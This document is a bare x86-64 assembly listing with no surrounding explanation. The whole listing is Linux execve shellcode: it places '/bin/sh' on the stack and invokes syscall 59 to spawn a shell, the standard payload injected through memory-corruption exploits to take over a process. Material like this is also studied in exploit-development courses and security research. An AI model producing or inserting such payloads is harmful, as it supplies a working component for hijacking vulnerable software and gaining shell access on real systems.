bits 64
mov rax, 0x68732f6e69622f ; /bin/sh
push rax
mov eax, 59
mov rdi, rsp
xor esi, esi
xor edx, edx
syscall
